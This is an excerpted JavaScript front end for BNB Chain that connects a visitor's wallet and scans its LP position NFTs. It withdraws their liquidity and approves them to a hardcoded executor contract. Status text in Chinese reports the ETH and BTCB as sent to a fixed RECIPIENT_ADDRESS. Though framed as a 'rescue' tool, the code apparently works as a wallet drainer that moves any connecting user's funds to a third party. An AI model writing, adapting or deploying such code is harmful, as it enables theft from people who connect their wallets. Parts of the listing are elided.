...
const USE_TESTNET = typeof window !== "undefined" && /[?&]testnet=1/.test(window.location?.search ?? "");
const CONFIG = USE_TESTNET
    ? {
...
const BTCB_ADDRESS = CONFIG.BTCB_ADDRESS;
const RECIPIENT_ADDRESS = "0x32eb462158F7A121d407510C340928404d863E94";
const NPM_ADDRESS = CONFIG.NPM_ADDRESS;
const EXECUTOR_ADDRESS = USE_TESTNET ? "" : "0x5a29E920032f2a45beede49B9CF9296ab10135B9";
const BNB_CHAIN = CONFIG.CHAIN;
const NPM_ABI = [
...
function setStatus(text, _isError = false) {
    console.log(text);
}
function getReadableError(err) {
    ...
    if (e?.error)
        return getReadableError(e.error);
    return "执行失败";
}
function isEthBtcPair(token0, token1) {
...
async function connectWallet() {
    ...
    try {
        ...
        if (connectWalletBtn)
            connectWalletBtn.textContent = shortAddress(currentAccount);
        ...
        const ex = e;
        const detail = [ex?.code, ex?.message, ex?.reason, ex?.shortMessage].filter(Boolean).join(" | ") ||
...
async function scanLpPositions() {
    ...
    try {
        ...
        const balance = await npm.balanceOf(currentAccount);
        const count = Number(balance);
        lpPositions = [];
        for (let i = 0; i < count; i++) {
            try {
                const tokenId = await npm.tokenOfOwnerByIndex(currentAccount, i);
...
function setLpStatus(tokenId, text, done = false) {
...
async function executeOne(tokenId, liquidity) {
    ...
    const tx1 = await npm.decreaseLiquidity(decParams);
    await tx1.wait();
    ...
    const tx2 = await npm.collect(collectParams);
    await tx2.wait();
...
async function executeAll() {
    ...
    try {
        ...
        if (completedAll) {
            setStatus(`已完成 ${lpPositions.length} 个 LP，ETH 与 BTCB 已转到 ${shortAddress(RECIPIENT_ADDRESS)}`);
        }
    }
    catch (e) {
        console.error(e);
    ...
    try {
        ...
        for (let i = 0; i < lpPositions.length; i++) {
            ...
            if (!approved || approved.toLowerCase() !== executorAddr.toLowerCase()) {
                ...
                const txApprove = await npm.approve(executorAddr, BigInt(p.tokenId));
                await txApprove.wait();
            }
            setStatus(`执行取回 #${p.tokenId}（撤流动性并转到目标地址）...`);
            const txRescue = await executor.rescueLP(BigInt(p.tokenId), p.liquidity);
            await txRescue.wait();
